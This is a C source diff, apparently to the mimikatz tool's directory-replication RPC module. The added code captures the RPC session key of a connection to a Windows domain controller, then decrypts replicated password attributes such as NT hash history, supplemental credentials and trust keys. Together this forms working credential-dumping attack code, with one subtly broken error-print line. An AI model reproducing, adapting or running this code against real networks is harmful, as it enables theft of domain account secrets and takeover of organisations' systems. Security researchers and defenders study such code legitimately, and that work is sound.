@@ -18,8 +18,28 @@ void __RPC_USER midl_user_free(void __RPC_FAR * p)
 	free(p);
 }
 
+SecPkgContext_SessionKey kull_m_rpc_drsr_g_sKey = {0, NULL};
+void RPC_ENTRY kull_m_rpc_drsr_RpcSecurityCallback(void *Context)
+{
+	RPC_STATUS rpcStatus;
+	SECURITY_STATUS secStatus;
+	PCtxtHandle data = NULL;
+
+	rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID *) &data);
+	if(rpcStatus == RPC_S_OK)
+	{
+		if(kull_m_rpc_drsr_g_sKey.SessionKey)
+		{
+			FreeContextBuffer(kull_m_rpc_drsr_g_sKey.SessionKey);
+			kull_m_rpc_drsr_g_sKey.SessionKeyLength = 0;
+			kull_m_rpc_drsr_g_sKey.SessionKey = NULL;
+		}
+		secStatus = QueryContextAttributes((PCtxtHandle) data, SECPKG_ATTR_SESSION_KEY, (LPVOID) &kull_m_rpc_drsr_g_sKey);
+	}
+}
+
 const wchar_t PREFIX_LDAP[] = L"ldap/";
-BOOL kull_m_rpc_drsr_createBinding(LPCWSTR server, RPC_SECURITY_CALLBACK_FN securityCallback, RPC_BINDING_HANDLE *hBinding)
+BOOL kull_m_rpc_drsr_createBinding(LPCWSTR server, RPC_BINDING_HANDLE *hBinding)
 {
 	BOOL status = FALSE;
 	RPC_STATUS rpcStatus;
@@ -47,9 +67,9 @@ BOOL kull_m_rpc_drsr_createBinding(LPCWSTR server, RPC_SECURITY_CALLBACK_FN secu
 					if(!status)
 						PRINT_ERROR(L"RpcBindingSetAuthInfoEx: 0x%08x (%u)\n", rpcStatus, rpcStatus);
 
-					if(status && securityCallback)
+					if(status)
 					{
-						rpcStatus = RpcBindingSetOption(*hBinding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR) securityCallback);
+						rpcStatus = RpcBindingSetOption(*hBinding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR) kull_m_rpc_drsr_RpcSecurityCallback);
 						status = (rpcStatus == RPC_S_OK);
 						if(!status)
 							PRINT_ERROR(L"RpcBindingSetOption: 0x%08x (%u)\n", rpcStatus, rpcStatus);
@@ -86,9 +106,7 @@ BOOL kull_m_rpc_drsr_getDomainAndUserInfos(RPC_BINDING_HANDLE *hBinding, LPCWSTR
 	DRS_MSG_DCINFOREQ dcInfoReq = {0};
 	DWORD dcOutVersion = 0;
 	DRS_MSG_DCINFOREPLY dcInfoRep = {0};
-	DRS_MSG_CRACKREQ nameCrackReq = {0};
-	DWORD nameCrackOutVersion = 0, nameStatus;
-	DRS_MSG_CRACKREPLY nameCrackRep = {0};
+	LPWSTR sGuid;
 	UNICODE_STRING uGuid;
 
 	RpcTryExcept
@@ -127,31 +145,11 @@ BOOL kull_m_rpc_drsr_getDomainAndUserInfos(RPC_BINDING_HANDLE *hBinding, LPCWSTR
 			}
 			else if(User)
 			{
-				nameCrackReq.V1.formatOffered = wcschr(User, L'\\') ? DS_NT4_ACCOUNT_NAME : wcschr(User, L'=') ? DS_FQDN_1779_NAME : wcschr(User, L'@') ? DS_USER_PRINCIPAL_NAME : DS_NT4_ACCOUNT_NAME_SANS_DOMAIN;
-				nameCrackReq.V1.formatDesired = DS_UNIQUE_ID_NAME;
-				nameCrackReq.V1.cNames = 1;
-				nameCrackReq.V1.rpNames = (LPWSTR *) &User;
-				drsStatus = IDL_DRSCrackNames(hDrs, 1, &nameCrackReq, &nameCrackOutVersion, &nameCrackRep);
-				if(drsStatus == 0)
+				if(kull_m_rpc_drsr_CrackName(hDrs, wcschr(User, L'\\') ? DS_NT4_ACCOUNT_NAME : wcschr(User, L'=') ? DS_FQDN_1779_NAME : wcschr(User, L'@') ? DS_USER_PRINCIPAL_NAME : DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, User, DS_UNIQUE_ID_NAME, &sGuid, NULL))
 				{
-					if(nameCrackOutVersion == 1)
-					{
-						if(nameCrackRep.V1.pResult->cItems == 1)
-						{
-							nameStatus = nameCrackRep.V1.pResult->rItems[0].status;
-							if(!nameStatus)
-							{
-								RtlInitUnicodeString(&uGuid, nameCrackRep.V1.pResult->rItems[0].pName);
-								ObjectGUIDfound = NT_SUCCESS(RtlGUIDFromString(&uGuid, UserGuid));
-							}
-							else PRINT_ERROR(L"CrackNames (name status): 0x%08x (%u)\n", nameStatus, nameStatus);
-						}
-						else PRINT_ERROR(L"CrackNames: no item!\n");
-					}
-					else PRINT_ERROR(L"CrackNames: bad version (%u)\n", nameCrackOutVersion);
-					kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(nameCrackOutVersion, &nameCrackRep);
+					RtlInitUnicodeString(&uGuid, sGuid);
+					ObjectGUIDfound = NT_SUCCESS(RtlGUIDFromString(&uGuid, UserGuid));
 				}
-				else PRINT_ERROR(L"CrackNames: 0x%08x (%u)\n", drsStatus, drsStatus);
 			}
 			drsStatus = IDL_DRSUnbind(&hDrs);
 			MIDL_user_free(pDrsExtensionsOutput);
@@ -160,7 +158,7 @@ BOOL kull_m_rpc_drsr_getDomainAndUserInfos(RPC_BINDING_HANDLE *hBinding, LPCWSTR
 	RpcExcept(DRS_EXCEPTION)
 		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
 	RpcEndExcept
-	return (DomainGUIDfound && ObjectGUIDfound);
+	return (DomainGUIDfound && (ObjectGUIDfound || !(Guid || User)));
 }
 
 BOOL kull_m_rpc_drsr_getDCBind(RPC_BINDING_HANDLE *hBinding, GUID *NtdsDsaObjectGuid, DRS_HANDLE *hDrs)
@@ -183,6 +181,135 @@ BOOL kull_m_rpc_drsr_getDCBind(RPC_BINDING_HANDLE *hBinding, GUID *NtdsDsaObject
 		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
 	RpcEndExcept
 		return status;
+}
+
+BOOL kull_m_rpc_drsr_CrackName(DRS_HANDLE hDrs, DS_NAME_FORMAT NameFormat, LPCWSTR Name, DS_NAME_FORMAT FormatWanted, LPWSTR *CrackedName, LPWSTR *CrackedDomain)
+{
+	BOOL status = FALSE;
+	DRS_MSG_CRACKREQ nameCrackReq = {0};
+	DWORD nameCrackOutVersion = 0, drsStatus;
+	DRS_MSG_CRACKREPLY nameCrackRep = {0};
+
+	nameCrackReq.V1.formatOffered = NameFormat;
+	nameCrackReq.V1.formatDesired = FormatWanted;
+	nameCrackReq.V1.cNames = 1;
+	nameCrackReq.V1.rpNames = (LPWSTR *) &Name;
+
+	RpcTryExcept
+	{
+		drsStatus = IDL_DRSCrackNames(hDrs, 1, &nameCrackReq, &nameCrackOutVersion, &nameCrackRep);
+		if(drsStatus == 0)
+		{
+			if(nameCrackOutVersion == 1)
+			{
+				if(nameCrackRep.V1.pResult->cItems == 1)
+				{
+					drsStatus = nameCrackRep.V1.pResult->rItems[0].status;
+					if(status = (drsStatus == DS_NAME_NO_ERROR))
+					{
+						kull_m_string_copy(CrackedName, nameCrackRep.V1.pResult->rItems[0].pName);
+						kull_m_string_copy(CrackedDomain, nameCrackRep.V1.pResult->rItems[0].pDomain);
+					}
+					else PRINT_ERROR(L"CrackNames (name status): 0x%08x (%u)\n", drsStatus, drsStatus);
+				}
+				else PRINT_ERROR(L"CrackNames: no item!\n");
+			}
+			else PRINT_ERROR(L"CrackNames: bad version (%u)\n", nameCrackOutVersion);
+			kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(nameCrackOutVersion, &nameCrackRep);
+		}
+		else PRINT_ERROR(L"CrackNames: 0x%08x (%u)\n", drsStatus, drsStatus);
+	}
+	RpcExcept(DRS_EXCEPTION)
+		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+	RpcEndExcept
+
+	return status;
+}
+
+BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply(REPLENTINFLIST *objects) // very partial, ofc
+{
+	REPLENTINFLIST * pReplentinflist, *pNextReplentinflist = objects;
+	DWORD i, j;
+	while(pReplentinflist = pNextReplentinflist)
+	{
+		pNextReplentinflist = pReplentinflist->pNextEntInf;
+		if(pReplentinflist->Entinf.AttrBlock.pAttr)
+		{
+			for(i = 0; i < pReplentinflist->Entinf.AttrBlock.attrCount; i++)
+			{
+				switch(pReplentinflist->Entinf.AttrBlock.pAttr[i].attrTyp)
+				{
+				case ATT_CURRENT_VALUE:
+				case ATT_UNICODE_PWD:
+				case ATT_NT_PWD_HISTORY:
+				case ATT_DBCS_PWD:
+				case ATT_LM_PWD_HISTORY:
+				case ATT_SUPPLEMENTAL_CREDENTIALS:
+				case ATT_TRUST_AUTH_INCOMING:
+				case ATT_TRUST_AUTH_OUTGOING:
+				// case another :
+				// case another :
+					if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal)
+						for(j = 0; j < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; j++)
+							if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j].pVal)
+								if(!kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(&pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j]))
+									return FALSE;
+					break;
+				default:
+					break;
+				}
+			}
+		}
+	}
+	return TRUE;
+}
+
+BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(ATTRVAL *val)
+{
+	BOOL status = FALSE;
+	PENCRYPTED_PAYLOAD encrypted;
+	MD5_CTX md5ctx;
+	CRYPTO_BUFFER cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL}, cryptoData;
+	DWORD realLen, calcChecksum;
+	PVOID toFree;
+
+	if(kull_m_rpc_drsr_g_sKey.SessionKey && kull_m_rpc_drsr_g_sKey.SessionKeyLength)
+	{
+		if((val->valLen >= FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData)) && val->pVal)
+		{
+			encrypted = (PENCRYPTED_PAYLOAD) val->pVal;
+			MD5Init(&md5ctx);
+			MD5Update(&md5ctx, kull_m_rpc_drsr_g_sKey.SessionKey, kull_m_rpc_drsr_g_sKey.SessionKeyLength);
+			MD5Update(&md5ctx, encrypted->Salt, sizeof(encrypted->Salt));
+			MD5Final(&md5ctx);
+			cryptoKey.Buffer = md5ctx.digest;
+
+			cryptoData.Length = cryptoData.MaximumLength = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, CheckSum);
+			cryptoData.Buffer = (PBYTE) &encrypted->CheckSum;
+
+			if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
+			{
+				realLen = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData);
+				calcChecksum = kull_m_crypto_crc32(0, encrypted->EncryptedData, realLen);
+				if(calcChecksum == encrypted->CheckSum)
+				{
+					toFree = val->pVal;
+					if(val->pVal = (UCHAR *) MIDL_user_allocate(realLen))
+					{
+						RtlCopyMemory(val->pVal, encrypted->EncryptedData, realLen);
+						val->valLen = realLen;
+						status = TRUE;
+						MIDL_user_free(toFree);
+					}
+				}
+				else PRINT_ERROR(L"Checksums don\'t match (C:0x%08 - R:0x%08x)\n", calcChecksum == encrypted->CheckSum);
+			}
+			else PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+		}
+		else PRINT_ERROR(L"No valid data\n");
+	}
+	else PRINT_ERROR(L"No Session Key\n");
+	return status;
 }
 
 void kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(DWORD nameCrackOutVersion, DRS_MSG_CRACKREPLY * reply)
@@ -257,7 +384,7 @@ void kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data(DWORD dcOutVersion, DRS_MSG_D
 void kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(DWORD dwOutVersion, DRS_MSG_GETCHGREPLY * reply)
 {
 	DWORD i, j;
-	REPLENTINFLIST * pReplentinflist, *pNextReplentinflist;
+	REPLENTINFLIST *pReplentinflist, *pNextReplentinflist;
 	if(reply)
 	{
 		switch(dwOutVersion)
